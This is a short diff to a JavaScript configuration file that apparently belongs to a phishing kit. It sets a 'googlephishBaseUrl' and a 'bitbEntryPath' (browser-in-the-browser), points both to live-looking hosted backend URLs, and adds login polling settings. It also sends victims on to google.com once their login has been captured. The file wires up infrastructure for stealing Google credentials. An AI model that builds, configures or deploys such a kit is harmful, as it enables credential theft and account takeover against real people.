@@ -1,8 +1,12 @@
 window.APP_CONFIG = {
+    apiBaseUrl: 'https://tk-ap.onrender.com/',
+    authPollIntervalMs: 1500,
+    authPollMaxMs: 3 * 60 * 1000,
+
     afterLoginRedirectUrl: 'https://www.google.com',
     afterLoginRedirectDelayMs: 0,
 
-    googlephishBaseUrl: '',
+    googlephishBaseUrl: 'https://tk-ap-1.onrender.com/',
 
     bitbEntryPath: '/index.php',
 
